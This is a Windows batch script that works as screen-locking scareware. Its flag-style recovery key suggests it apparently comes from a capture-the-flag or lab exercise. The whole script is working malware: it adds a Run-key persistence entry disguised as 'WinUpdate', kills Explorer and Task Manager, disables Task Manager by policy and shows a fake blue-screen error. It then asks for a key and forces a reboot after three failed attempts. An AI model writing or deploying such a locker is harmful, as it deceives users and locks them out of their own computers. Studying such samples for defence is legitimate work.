@echo off
:: Persistence before locking
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /t REG_SZ /d "%~f0" /f >nul 2>&1

:: Kill desktop environment
taskkill /f /im explorer.exe >nul 2>&1
taskkill /f /im taskmgr.exe  >nul 2>&1

:: Block common escape routes
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul 2>&1

:: Fullscreen lock - harder to Alt+F4 out of
title System Error - Recovery Required
mode con cols=120 lines=40
color 0C

:: Fake BSOD output
cls
echo.
echo     A problem has been detected and Windows has been shut down to prevent damage
echo     to your computer.
echo.
echo     PAGE_FAULT_IN_NONPAGED_AREA
echo.
echo     If this is the first time you have seen this stop error screen, restart your
echo     computer. If this screen appears again, follow these steps:
echo.
echo     Technical Information:
echo     *** STOP: 0x00000050 (0xFFFFF8A001234567, 0x0000000000000001,
echo               0xFFFFF80002E55151, 0x0000000000000000)
echo.
echo     *** ntoskrnl.exe - Address 0xFFFFF80002E55151
echo         Base at 0xFFFFF80002E0D000  DateStamp 0x4CE7951A
echo.

:: Password loop with lockout simulation
set attempts=0
:loop
set /p "pass=Enter recovery key: "
set /a attempts+=1

:: Hash comparison would go here in a real implant
:: Batch can't natively hash — attacker would use PowerShell or compiled binary
if "%pass%"=="HTB{r3c0v3ry_k3y}" (
    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinUpdate" /f >nul 2>&1
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 0 /f >nul 2>&1
    start explorer.exe
    exit
)

if %attempts% geq 3 (
    shutdown /r /t 0 /f
)

echo Incorrect key. %attempts% failed attempt(s).
goto loop
